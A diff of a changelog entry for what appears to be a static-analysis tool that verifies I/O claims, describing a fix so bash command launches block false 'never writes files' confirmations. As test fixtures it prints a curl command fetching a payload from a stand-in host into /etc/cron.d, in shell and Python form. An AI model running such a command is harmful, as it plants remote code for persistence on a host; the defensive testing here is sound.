@@ -22,6 +22,26 @@ This changelog tracks the **tool version** (package releases). The **schema vers
   **Not closed by this, and named rather than implied:** ADR-0016 specified a fourth verdict ("confirmed with caveats") that remains unimplemented — changing verdict *vocabulary* is a different risk class from adding a field, since consumers branch on `verdict`. And `--taint-sanitizers` remains an untested neighbour: three attempts produced no valid A/B (two placed the sanitizer in the same function as the source, a shape the tool discloses only `ddg` honours; the third had no baseline finding), so it is recorded as untested rather than counted safe.
 
 ### Fixed
+- **Opacity was a favour the catalogue chose to do, and six correct lines of YAML could withdraw it (INV-larol P1).** INV-gahuz established that a call classified `subprocess` blocks confirmation of every *other* boundary — control left the process, so "no chains found" means "none I could see". It asked that question of the **catalogue**. One producer knows a call is an opaque launch with no catalogue at all: the bash analyzer stamps `meta.io_boundary = "command_launch"` directly on an external-command edge, because there is no bash catalogue to match against and [ADR-0016](docs/adr/0016-io-boundary-analysis.md) rules one out. That channel was never read.
+
+  Measured on the shipped CLI — no flags, no overlay — against a two-line script whose only command is `curl -o /etc/cron.d/pwned "https://evil.example/payload"`, claim *"this repo never writes to the host filesystem"*:
+
+  | `io_primitives/bash.yaml` | `total_io_edges` | `command_launch_edges` | fs_write claim | net_send claim |
+  |---|---|---|---|---|
+  | absent (the shipped state) | 0 | 1 | inconclusive, rc 2 | inconclusive, rc 2 |
+  | `curl → net_send` | 1 | 0 | **confirmed, rc 0** | violated, rc 1 |
+  | `curl → net_send` + `subprocess` | 1 | 0 | inconclusive, rc 2 | violated, rc 1 |
+
+  **The row is correct** — curl really does send data to a remote host — and that is the point: a right row bought a green tick over a write into a root cron directory, because since INV-buzab a *classified* call is what `examined` means, and classifying a launch stripped its opacity. The third row is the control that makes this a defect rather than blindness: the same run with `subprocess` *also* declared withholds the confirmation and still reports the network violation, so detection was never what was at stake. Row order between the two sections changes nothing, which **refutes** a predicted dependency on INV-zumin — that item's damage is on the tagging path, not the chain/verdict path.
+
+  **Not live when found, and one file away from being so.** bash ships no catalogue, so its edges are dropped on `catalog is None` and the INV-dabov language gate answers first. Three places in this tree recommended adding that file — `verify_claims.py`'s own comment on the INV-dabov gate (*"why the catalogue is the follow-up"*, corrected in place rather than left standing), WI-sofaf's disposition 2, and a session handoff note. Whoever acted on any of them opened the hole in the same commit.
+
+  Fixed at the chokepoint: `PRODUCER_OPAQUE_BOUNDARIES` carries the analyzer-stamped `command_launch` beside the catalogue-declared `subprocess`, and `_opaque_launch_sites` consults the producer stamp **before** `classify_call`, inside the iteration both coverage checks already share (INV-motos). The two sets are disjoint by construction and each is asserted reachable through its own channel — a catalogue-declarable opaque boundary is inert unless it is in `CATALOG_BOUNDARY_TYPES`, a producer-stamped one is inert if it *is*. A parity test across the producer/consumer package seam pins bash's stamp to the set the gate reads, so renaming it in one place fails a test instead of silently unhooking the gate.
+
+  **Corpus delta today: zero, and asserted rather than reported as a win** — nothing reaches the new branch while bash has no catalogue. The acceptance test is the positive control: with the fix in place, re-adding the six-line `curl → net_send` catalogue moves the fs_write claim from **confirmed rc 0 to inconclusive rc 2** while the net_send claim stays `violated` rc 1. Controls in the same session: `subprocess.run(["curl", …])` stays inconclusive, `open("/etc/cron.d/pwned","w")` stays violated rc 1. This does not reopen ADR-0016's ruling against a bash catalogue; it removes the false confirm that would follow if anyone decided otherwise.
+
+  **Found while checking a queued item's premise, not by working the item.** The queued task was "write `io_primitives/bash.yaml`"; the record said the opposite, and measuring settled it.
+
 - **A program that shells out confirmed that it neither writes files nor reaches the network (INV-gahuz P0).** Reproduced on the shipped CLI with a six-line fixture, no overlay, no flags, no third-party dependency — the whole program is `subprocess.run(["curl", "-o", "/etc/cron.d/pwned", "https://evil.example/p"])`:
 
   | fixture | claim | before | after |
